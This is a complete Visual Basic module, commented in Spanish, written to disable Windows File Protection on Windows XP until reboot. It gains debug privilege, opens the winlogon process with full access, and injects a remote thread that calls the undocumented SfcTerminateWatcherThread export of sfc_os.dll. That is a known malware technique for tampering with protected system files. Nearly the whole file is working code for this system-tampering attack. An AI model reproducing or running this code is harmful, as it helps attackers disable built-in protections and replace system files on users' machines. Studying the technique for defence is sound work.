'---------------------------------------------------------------------------------------
' Module        : mDisableWFP
' Fecha         : 15/02/2009 12:10
' Autor         : XcryptOR
' Proposito     : Deshabilita la WFP (Windows File Protection)Hasta el proximo Reinicio
' SO            : Windows XP Sp1, Sp2, Sp3
'---------------------------------------------------------------------------------------
 
Declare Function OpenProcessToken Lib "advapi32.dll" ( _
ByVal ProcessHandle As Long, _
ByVal DesiredAccess As Long, _
TokenHandle As Long) As Long
 
Declare Function CloseHandle Lib "kernel32.dll" ( _
ByVal hObject As Long) As Long
 
Declare Function GetCurrentProcess Lib "kernel32.dll" () As Long
 
Declare Function AdjustTokenPrivileges Lib "advapi32.dll" ( _
ByVal TokenHandle As Long, _
ByVal DisableAllPrivileges As Long, _
ByRef NewState As TOKEN_PRIVILEGES, _
ByVal BufferLength As Long, _
PreviousState As Any, _
ReturnLength As Long) As Long
 
Declare Function LookupPrivilegeValue Lib "advapi32.dll" Alias "LookupPrivilegeValueA" ( _
ByVal lpSystemName As String, _
ByVal lpName As String, _
lpLuid As LUID) As Long
 
Declare Function CreateToolhelp32Snapshot Lib "kernel32.dll" ( _
ByVal dwFlags As Long, _
ByVal th32ProcessID As Long) As Long
 
Declare Function Process32First Lib "kernel32.dll" ( _
ByVal hSnapshot As Long, _
lppe As PROCESSENTRY32) As Long
 
Declare Function Process32Next Lib "kernel32.dll" ( _
ByVal hSnapshot As Long, _
lppe As PROCESSENTRY32) As Long
 
Declare Function OpenProcess Lib "kernel32.dll" ( _
ByVal dwDesiredAccess As Long, _
ByVal bInheritHandle As Long, _
ByVal dwProcessId As Long) As Long
 
Declare Function CreateRemoteThread Lib "kernel32.dll" ( _
ByVal hProcess As Long, _
ByRef lpThreadAttributes As Any, _
ByVal dwStackSize As Long, _
ByVal StartAddress As Long, _
ByRef lpParameter As Any, _
ByVal dwCreationFlags As Long, _
ByRef lpThreadId As Long) As Long
 
Declare Function LoadLibrary Lib "kernel32.dll" Alias "LoadLibraryA" ( _
ByVal lpLibFileName As String) As Long
 
Declare Function GetProcAddress Lib "kernel32.dll" ( _
ByVal hModule As Long, _
ByVal OrdinalNumber As Long) As Long
 
Declare Function FreeLibrary Lib "kernel32.dll" ( _
ByVal hLibModule As Long) As Long
 
Declare Function WaitForSingleObject Lib "kernel32.dll" ( _
ByVal hHandle As Long, _
ByVal dwMilliseconds As Long) As Long
 
Const TOKEN_ALL_ACCESS = 983551
Const PROCESS_ALL_ACCESS = &H1F0FFF
Const TH32CS_SNAPPROCESS As Long = &H2
Const INFINITE = &HFFFF&
 
Type LUID
        LowPart             As Long
        HighPart            As Long
End Type
 
Type LUID_AND_ATTRIBUTES
        pLuid               As LUID
        Attributes          As Long
End Type
 
Type TOKEN_PRIVILEGES
        PrivilegeCount      As Long
        Privileges(1)       As LUID_AND_ATTRIBUTES
End Type
 
Type PROCESSENTRY32
        dwSize              As Long
        cntUsage            As Long
        th32ProcessID       As Long
        th32DefaultHeapID   As Long
        th32ModuleID        As Long
        cntThreads          As Long
        th32ParentProcessID As Long
        pcPriClassBase      As Long
        dwFlags             As Long
        szExeFile           As String * 260
End Type
 
Sub Main()
 
    SetPrivilegies
 
    If DisableWFP = True Then
        MsgBox "Se ha deshabilitado la WFP, hasta el proximo reinicio."
    Else
        MsgBox "Error al abrir winlogon! no se puede desactivar WFP"
    End If
 
 
End Sub
 
'==============================================================================
'================ OBTENER PID (PROCESS ID) DEL NOMBRE =========================
'==============================================================================
Public Function GetPid(szProcess As String)
    On Error Resume Next
 
    Dim Pid         As Long
    Dim l           As Long
    Dim l1          As Long
    Dim l2          As Long
    Dim Ol          As Long
    Dim pShot       As PROCESSENTRY32
 
    l1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    pShot.dwSize = Len(pShot)
    l2 = Process32Next(l1, pShot)
    Do While l2
        If InStr(pShot.szExeFile, szProcess) <> 0 Then
            Pid = pShot.th32ProcessID
            GetPid = Pid
        End If
        l2 = Process32Next(l1, pShot)
    Loop
    l = CloseHandle(l1)
 
End Function
'==============================================================================
'=========================== OBTENER PRIVILEGIOS ==============================
'==============================================================================
Sub SetPrivilegies()
 
    Dim hToken      As Long
    Dim pLuid       As LUID
    Dim TokenPriv   As TOKEN_PRIVILEGES
 
    If OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, hToken) = 0 Then
        End
    End If
 
    LookupPrivilegeValue vbNullString, "SeDebugPrivilege", pLuid
 
    With TokenPriv
        .PrivilegeCount = 1
        .Privileges(0).pLuid = pLuid
        .Privileges(0).Attributes = 2
    End With
 
    AdjustTokenPrivileges hToken, 0, TokenPriv, Len(TokenPriv), ByVal 0&, ByVal 0&
    CloseHandle hToken
 
End Sub
'==============================================================================
'==== DESHABILITAR LA WFP (WINDOWS FILE PROTECTION) HASTA PROXIMO REINICIO ====
'==============================================================================
 
Function DisableWFP() As Boolean
 
    Dim LoadDll     As Long
    Dim hProcess    As Long
    Dim RemThread   As Long
    Dim SfcTerminateWatcherThread  As Long
 
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPid("winlogon.exe"))
 
    If hProcess = 0 Then
        DisableWFP = False
        End
    End If
 
    LoadDll = LoadLibrary("SFC_OS.DLL")          'sfc_os.dll
    SfcTerminateWatcherThread = GetProcAddress(LoadDll, 2)      'Api SfcTerminateWatcherThread ordinal:#2 de sfc_os.dll
    RemThread = CreateRemoteThread(hProcess, ByVal 0&, 0, ByVal SfcTerminateWatcherThread, ByVal 0&, 0, ByVal 0&)
 
    WaitForSingleObject RemThread, INFINITE
    CloseHandle hProcess
    FreeLibrary LoadDll
    DisableWFP = True
 
End Function
